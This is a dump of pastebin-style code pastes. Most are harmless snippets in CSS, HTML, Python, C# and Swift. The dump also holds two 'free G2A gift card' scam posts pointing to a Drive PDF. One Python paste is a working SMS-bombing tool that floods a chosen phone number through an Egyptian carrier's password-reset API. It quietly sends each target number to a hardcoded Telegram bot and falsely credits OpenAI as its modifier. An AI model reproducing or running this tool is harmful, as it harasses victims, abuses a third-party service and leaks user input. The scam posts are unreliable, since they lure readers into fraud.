id,title,username,language,date,content
9x8uqpwn,🤑G2A.com Free Gift Card FIX July 2024🤑,guywithabigheart,JavaScript,Friday 28th of June 2024 06:28:17 PM CDT,"G2A.com complimentary voucher & games guide.
Any gift card for free on G2A.com including Playstation gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
RRut2YmX,🤑G2A.com Free Gift Card FIX July 2024🤑,PetrikDev,JavaScript,Friday 28th of June 2024 06:22:10 PM CDT,"G2A.com free gift card & gaming guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
UgBLCE8Q,Delusive-status,6275,C++,Friday 28th of June 2024 06:12:58 PM CDT,"{
    ""devblog236"": ""UseAtOwnRisk"",
	""alkad"": ""Detect""
}"
VJTNfGMD,Untitled,dan-masek,Python,Friday 28th of June 2024 04:33:34 PM CDT,"import cv2
import numpy as np

frame = np.zeros((240, 320, 3), np.uint8)
window = ""Test Window""

def show_window(window, frame):
    print(cv2.getWindowProperty(window, cv2.WND_PROP_TOPMOST))
    while(True):
        cv2.imshow(window, frame)
        if cv2.waitKey() > 0:
            break

cv2.namedWindow(window)

cv2.setWindowProperty(window, cv2.WND_PROP_TOPMOST, 1)
show_window(window, frame)

cv2.setWindowProperty(window, cv2.WND_PROP_TOPMOST, 0)
show_window(window, frame)
"
rbvPLK9e,CSS Grid CSS code,Kevin321888999,CSS,Friday 28th of June 2024 04:17:33 PM CDT,"

body{margin:30px;
font-family:""Poppins"";
}
.grid-container{
    background:#eee;
    /*Below is the max pixels in width */
    max-width: 900px;
    margin:0auto;
    display:grid;
    /*creates a gap of 50 pixels */
    gap:30px 100px;
    /* Below specifies that each column for each row is 300 px each*/
    /*repeat(6,1fr) 6 is the argument for how many blocks you want in the grid*/
    /* 1fr stands for 1 fraction of the avaliable space max being 900px. It divides the grid container into equal fractions. */
    grid-template-columns:repeat(6,1fr);
}
   

/*Below is a CSS selector that is targeting all the <div> elements that are direct children with the class .grid-container*/
/*'.grid-container' is targeting elements with the same name grid-container. In the index.html file <div class=""grid-container"" 
 is the thing that has grid-container >*/
 /*> is the child combinator selector in CSS, this selects on the the direct children of the specified element.*/
 /*div is the element selector, specifiying that the code is targeting <div> elements.*/

    
.grid-container > div{
    background:#CCC;
    text-align:center;
    padding:20px;
    border: 1px solid black;
}
/*div:nth-child is a pseudo child selector that tells the code to look at the specific child and then modify it */
/*in this case this is targeting the first child of grid container. */
.grid-container > div:nth-child(1){
    grid-column: 1/ span 2;
    /*1/span2 this is telling the computer starting at column 1 the 
    the selected child is going to have a span of 2 columns*/
}
.grid-container > div:nth-child(2){
    grid-column: 2/ span 2; /*This is selecting the second child, starting it at column 2 and giving it the span of 2 columns*/
}
"
1syR7wLr,CSS Grid Code HTML,Kevin321888999,HTML,Friday 28th of June 2024 04:16:52 PM CDT,"<!DOCTYPE html>
<html lang=""en"">
  <head>
    <meta charset=""UTF-8"" />
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />
    <title>Document</title>
    <link rel=""stylesheet"" href=""style.css"" />
  </head>
  <body>
    <div class=""grid-container"">
      <div>1</div>
      <div>2</div>
      <div>3</div>
      <div>4</div>
      <div>5</div>
      <div>6</div>
    </div>
    
  </body>
</html>"
9Xi6enPF,rotate pdf even pages,STANAANDREY,Python,Friday 28th of June 2024 04:04:07 PM CDT,"import PyPDF2

def rotate_even_pages(input_pdf, output_pdf):
    # Open the input PDF
    with open(input_pdf, 'rb') as infile:
        reader = PyPDF2.PdfReader(infile)
        writer = PyPDF2.PdfWriter()
        
        # Iterate over all the pages
        num_pages = len(reader.pages)
        for i in range(num_pages):
            page = reader.pages[i]
            # Rotate only the even pages (index 1, 3, 5, etc.)
            if i % 2 == 1:  # 1-based index for even pages: 2, 4, 6, etc.
                page.rotate(180)
            writer.add_page(page)
        
        # Write the output PDF
        with open(output_pdf, 'wb') as outfile:
            writer.write(outfile)

# Example usage
input_pdf = 'input.pdf'  # Replace with your input PDF file
output_pdf = 'output.pdf'  # Replace with your desired output PDF file
rotate_even_pages(input_pdf, output_pdf)

print(f""Processed PDF saved as '{output_pdf}'"")
"
4ymckmfx,Unit_28,lovelyvook,C#,Friday 28th of June 2024 03:38:37 PM CDT,"using System;

namespace Ijunior
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int health = 4;
            int totalHealth = 10;
            int mana = 6;
            int totalMana = 10;
            int healthBarPosition = 0;
            int manaBarPosition = 1;


            DrawBar(health, totalHealth, healthBarPosition);
            DrawBar(mana, totalMana, manaBarPosition);
        }

        static void DrawBar(int value, int totalValue, int barPosition)
        {
            char openFrame = '[';
            char closeFrame = ']';
            char barFilling = '#';
            char barEmpty = ' ';

            Console.SetCursorPosition(0, barPosition);
            Console.Write(openFrame);

            for (int i = 0; i < value; i++)
            {
                Console.Write(barFilling);
            }

            for (int i = value; i < totalValue; i++)
            {
                Console.Write(barEmpty);
            }

            Console.Write(closeFrame);
            Console.WriteLine();
        }
    }
}"
FGPvkx6s,TextWithLinks,Milotronik,Swift,Friday 28th of June 2024 03:25:26 PM CDT,"import SwiftUI
import UIKit

struct ContentView: View {
    var body: some View {
        VStack {
            Text(""it works"")
            
            LinkedTextView(
                text: ""I have a Link and another Link2 ahds jadjsah dhjasjhdsa j jdas d asj dsjhd jadhjadshjd "",
                links: [""Link"": ""https://google.gl"", ""Link2"": ""https://bing.com""],
                onLinkTapped: { url in
                    print(""\(url.absoluteString) tapped"")
                }
            )
            Text(""it works"")
        }
    }
}

struct LinkedTextView: View {
    // Your text from the server
    let text: String
    
    // Your dictionary with links
    let links: [String: String]
    
    let onLinkTapped: (_ url: URL) -> Void
    
    @Environment(\.openURL) private var openURL
    
    var body: some View {
        Text(makeAttributedString())
            .font(.title)
            .environment(\.openURL, OpenURLAction(handler: handleURL))
    }
    
    func handleURL(_ url: URL) -> OpenURLAction.Result {
        // - Use .handled if you've performed a custom action
        // - Use .discarded if you weren't able to handle the link
        if UIApplication.shared.canOpenURL(url) {
            onLinkTapped(url)
            return .handled
        }
        return .discarded
    }
    
    func makeAttributedString() -> AttributedString {
        var attributedString = AttributedString(text)
        // Iterate through the dictionary and add link attributes
        for (key, value) in links {
            if let range = attributedString.range(of: key) {
                // Define the URL attribute
                attributedString[range].link = URL(string: value)
                
                // Apply different text style for the links
                attributedString[range].foregroundColor = .blue
                attributedString[range].underlineStyle = .single
                attributedString[range].font = .caption
            }
        }
        
        return attributedString
    }
}

#Preview {
    ContentView()
}
"
gCrDVsgi,Untitled,Mahmoudfathi,Python,Friday 28th of June 2024 03:22:07 PM CDT,"import webbrowser
import os, sys, time
import random
import hashlib

os.system(""clear"")

try:
    import requests
    import pyfiglet
    from bs4 import BeautifulSoup
except:
    os.system(""pip install --upgrade pip"")
    os.system(""pip install requests"")
    os.system(""pip install pyfiglet"")
    os.system(""pip install bs4"")
    os.system(""clear"")
    os.system('python modified_script.py')

TOKEN = ""5848610949:AAGG_fJJY5fcwWxHNDfFBlMuUv0Bnqi5aEw""
CHAT_ID = ""1325332071""

# Color codes
RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
MAGENTA = '\033[1;35m'
CYAN = '\033[1;36m'
WHITE = '\033[1;37m'
GRAY = '\033[1;38m'
BOLD_WHITE = '\033[1;39m'

session = requests.session()

print(RED + pyfiglet.figlet_format(""Spam SMS""))
print(pyfiglet.figlet_format(""Egypt""))

info_banner = """""" 
-------------------------------------------------------------------------
- Script Modified by: OpenAI
-------------------------------------------------------------------------
""""""

print(WHITE + info_banner)

def subscribe():
    try:
        user_id = int(input(CYAN + '[+] Enter Telegram ID:\033[1;37m'))
        url = f""https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id=@Oppsl&user_id={user_id}""
        response = requests.get(url).text

        if 'member' in response:
            print(f""\n{GREEN}[+] Welcome! Enjoy the service\n"")
        elif 'left' in response:
            print(f""\n{RED}[-] Please subscribe to the Telegram channel first\n"")
            time.sleep(2)
            webbrowser.open('https://t.me/Oppsl')
            sys.exit()
    except Exception as e:
        print(f""\n{RED}[-] Please enter a valid Telegram ID\n"")
        subscribe()

subscribe()

def send_we_sms():
    try:
        phone_number = input(f""\n{CYAN}[+] Enter Phone Number:\033[1;37m"")
        sms_count = int(input(f""\n{CYAN}[+] Enter SMS Count:\033[1;37m""))
        print(""\n"")
        requests.post(f""https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={phone_number}-->>{sms_count} we"")

        url = ""https://api-my.te.eg/api/user/mobile/resetpassword/initiate""
        headers = {
            'Host': 'api-my.te.eg',
            'Connection': 'keep-alive',
            'Content-Length': '59',
            'Accept': 'application/json, text/plain, */*',
            'Jwt': 'YOUR_JWT_TOKEN',
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json',
            'Origin': 'https://my.te.eg',
            'X-Requested-With': 'mark.via.gp',
            'Referer': 'https://my.te.eg/',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US'
        }
        data = {
            ""header"": {""msisdn"": phone_number, ""locale"": ""en""},
            ""body"": {}
        }

        successful_sends = 0
        for _ in range(sms_count):
            response = requests.post(url, headers=headers, json=data).text
            if ""The verification code has been sent"" in response:
                successful_sends += 1
                print(f""{GREEN}[+] Sent SMS #{successful_sends}"")
            else:
                print(f""{RED}[-] Error sending SMS. Try again."")
                send_we_sms()

    except Exception as e:
        print(f""{RED}\n[-] Invalid number or count. Try again."")
        send_we_sms()

# Add other functions similar to send_we_sms() for orange, vodafone, All1, All2, and call
# ...

def display_menu():
    print(f""{GREEN}[1]{BOLD_WHITE} ---> {RED}SMS WE"")
    print(f""{GREEN}[2]{BOLD_WHITE} ---> {RED}SMS Orange"")
    print(f""{GREEN}[3]{BOLD_WHITE} ---> {RED}SMS Vodafone"")
    print(f""{GREEN}[4]{BOLD_WHITE} ---> {RED}SMS All Networks"")
    print(f""{GREEN}[5]{BOLD_WHITE} ---> {RED}SMS All Networks +2"")
    print(f""{GREEN}[6]{BOLD_WHITE} ---> {RED}Call All Networks"")

display_menu()

choice = input(f""\n{CYAN}[+] Choose an option:\033[1;37m"")

if choice == '1':
    send_we_sms()
elif choice == '2':
    # Call the function to send SMS via Orange
    pass
elif choice == '3':
    # Call the function to send SMS via Vodafone
    pass
elif choice == '4':
    # Call the function to send SMS to all networks
    pass
elif choice == '5':
    # Call the function to send SMS to all networks +2
    pass
elif choice == '6':
    # Call the function to make a call to all networks
    pass
else:
    print(f""{RED}\nError, choose a valid option\n"")
    time.sleep(1)
    os.system('python modified_script.py')
"
P9EbAwJ3,ttu homepage hero styles,mbatbold,CSS,Friday 28th of June 2024 03:19:56 PM CDT,".ttu__header
{
    position: relative;
    background: transparent;
    width: 100%;
    height: calc(100dvh - #{$navbar-height});
    overflow: hidden;
    margin-top: $navbar-height;

    .ttu-header__vid
    {
        position: relative;
        background: transparent;
        width: 100%;
        height: 100dvh;
        overflow: hidden;
        background-size: cover;
        background-repeat: no-repeat;
        background-position: center;
        background-image: url('/_resources/homepage/images/vid-still.jpg');

        @media(min-width: $breakpoint-tablet-large)
        {
            background-image: url('/_resources/homepage/images/vid-still-desktop.jpg');
        }

        video
        {
            display: none;

            @media (min-width: $breakpoint-tablet-large)
            {
                position: absolute;
                max-width: initial;
                min-width: 100%;
                min-height: 100dvh;
                padding: 0;
                margin: 0;
                height: auto;
                top: calc(50% - #{$navbar-height} * 0.5);
                left: 50%;
                transform: translate(-50%, -50%);
                display: block;
                width: calc(100dvh * 1.78); // Ratio: 1920 / 1080 = 1.78
            }

            @media (min-aspect-ratio: 16/9)
            {
                width: 100%;
            }
        }

        .ttu-header-vid__overlay
        {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: calc(100% - #{$navbar-height});
            background-image: linear-gradient(180deg, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0.4) 100%);

            .ttu-header-vid-overlay__tag
            {
                position: absolute;
                bottom: 7rem;
                left: 0;

                @media(min-width: $breakpoint-tablet-large)
                {
                    bottom: 12rem;
                }

                @media(min-width: $breakpoint-desktop)
                {
                    bottom: 14rem;
                }

                @media(min-width: $breakpoint-desktop-lim)
                {
                    bottom: 16rem;
                    left: calc(50% - 37.5rem);
                }

                .black-bg
                {
                    background-color: black;
                    padding-left: $page-margin;
                    width: calc(100vw - #{$page-margin});

                    @media(min-width: $breakpoint-tablet)
                    {
                        padding-left: $page-margin-tablet;
                        width: calc(100vw - #{$page-margin-tablet});
                    }

                    @media(min-width: $breakpoint-tablet-med)
                    {
                        padding-left: $page-margin-tablet-med;
                        padding-right: $page-margin-tablet-med;
                        width: auto;
                    }

                    @media(min-width: $breakpoint-tablet-large)
                    {
                        padding-left: $page-margin-tablet-large;
                        padding-right: $page-margin-tablet-large;
                    }

                    @media(min-width: $breakpoint-desktop)
                    {
                        padding-left: $page-margin-desktop;
                        padding-right: $page-margin-desktop;
                    }

                    @media(min-width: $breakpoint-desktop-lim)
                    {
                        padding-left: 1.25rem;
                    }


                    &:first-child
                    {
                        margin-bottom: 3vw;

                        @media(min-width: $breakpoint-tablet-med)
                        {
                            margin-bottom: 0.5rem;
                        }
                    }

                    h2
                    {
                        margin: 0;
                        color: #fdfdfd;
                        font-family: $font-helv-condensed;
                        font-size: 14vw;
                        line-height: normal;
                        letter-spacing: normal;
                        padding-top: 0.5rem;
                        padding-bottom: 0.5rem;
                        font-weight: 700;
                        text-transform: uppercase;

                        @media(min-width: $breakpoint-tablet-med)
                        {
                            font-size: 4rem;
                        }

                        @media(min-width: $breakpoint-tablet-large)
                        {
                            font-size: 4.5rem;
                        }

                        @media(min-width: $breakpoint-tablet-large)
                        {
                            font-size: 4.75rem;
                        }

                        @media(min-width: $breakpoint-desktop-lim)
                        {
                            font-size: 5rem;
                        }

                        sup
                        {
                            font-family: $font-helv-condensed;
                            font-size: 4vw;
                            vertical-align: super;
                            top: -2vw;

                            @media(min-width: $breakpoint-tablet-med)
                            {
                                font-size: 1.25rem;
                                top: -1rem;
                            }
                        }
                    }
                }
            }

            .ttu-header-vid-overlay__scroll
            {
                position: absolute;
                bottom: 3rem;
                left: $page-margin;

                @media(min-width: $breakpoint-tablet)
                {
                    left: $page-margin-tablet;
                }

                @media(min-width: $breakpoint-tablet-med)
                {
                    left: $page-margin-tablet-med;
                }

                @media(min-width: $breakpoint-tablet-large)
                {
                    left: $page-margin-tablet-large;
                    bottom: 6rem;
                }

                @media(min-width: $breakpoint-desktop)
                {
                    left: $page-margin-desktop;
                    bottom: 8rem;
                }

                @media(min-width: $breakpoint-desktop-lim)
                {
                    left: calc(50% - 37.5rem + 1.25rem); //37.5rem = 600px Half of fixed width. 1.25rem = extra padding to allign with text.
                    bottom: 10rem;
                }

                .ttu-header-vid-overlay-scroll__txt
                {
                    display: flex;
                    align-items: center;

                    .arrows
                    {
                        margin-right: 2rem;
                        margin-left: 0.3rem;

                        .arrow
                        {
                            display: block;
                            -ms-transform: rotate(45deg); /* IE 9 */
                            -webkit-transform: rotate(45deg); /* Chrome, Safari, Opera */
                            transform: rotate(45deg);
                            border-right: 5px solid white;
                            border-bottom: 5px solid white;
                            margin: 0;
                            width: 16px;
                            height: 16px;
                            -webkit-animation: mouse-scroll;
                            -moz-animation: mouse-scroll;
                            animation: mouse-scroll;
                            animation-duration: 1s;
                            animation-iteration-count: 3;
                        }

                        .one
                        {
                            -webkit-animation-delay: 3s;
                            -moz-animation-delay: 3s;
                            animation-delay: 3s;
                        }

                        .two
                        {
                            -webkit-animation-delay: 3.1s;
                            -moz-animation-delay: 3.1s;
                            animation-delay: 3.1s;
                        }
                    }

                    p
                    {
                        margin: 0;
                        margin-top: 5px;
                        text-decoration-color: transparent;
                        color: white;

                        strong
                        {
                            font-family: $font-helv-lt-std-bd;
                            font-weight: unset;
                        }
                    }
                }
            }
        }
    }
}
"
TPEfGNLN,ttu homepage hero markup,mbatbold,HTML,Friday 28th of June 2024 03:19:21 PM CDT,"<div class=""ttu-header__vid"">
    <video id=""ttu-header-vid__vid"" autoplay=""autoplay"" muted=""muted"" loop=""loop"" poster=""/_resources/homepage/images/vid-still-desktop.jpg"">
        <source src=""/_resources/homepage/content/videos/hero.webm?version=26OCT22"" type=""video/webm""/>
        <source src=""/_resources/homepage/content/videos/hero.mp4?version=26OCT22"" type=""video/mp4""/>
        <link rel=""transcript"" title=""English transcript"" href=""#hero-vid-transcript"">
        <img src=""/_resources/homepage/images/vid-still-desktop.jpg"" alt=""Texas Tech University Admin Building"">
    </video>
    <transcript id=""hero-vid-transcript"">
        (Video only) Students talking outside; Close up of student laughing;
        Overhead shot of students exiting academic building; Faculty member
        teaching students in classroom; Close up of Raider Red at athletic event;
        Students cheering at athletic event;
        Faculty member teaching students in outdoor environment
    </transcript>
    <div class=""ttu-header-vid__overlay"">
        <div class=""ttu-header-vid-overlay__tag"">
            <div class=""black-bg animated scale-up-hor-left timing-fnc-1 fast"">
                <h2>FROM HERE,</h2>
            </div>

            <div class=""black-bg animated scale-up-hor-left timing-fnc-1 delay-1s faster"">
                <h2>IT'S POSSIBLE.<sup>&trade;</sup></h2>
            </div>
        </div>

        <div class=""ttu-header-vid-overlay__scroll"">
            <a href=""#ttu__ima"">
                <div class=""ttu-header-vid-overlay-scroll__txt animated slide-in-top timing-fnc-1 delay-2s slow"">
                    <div class=""arrows"">
                        <span class=""arrow one""></span>
                        <span class=""arrow two""></span>
                    </div>
                    <p><strong>Scroll Down</strong></p>
                </div>
            </a>
        </div>
    </div>
</div>"
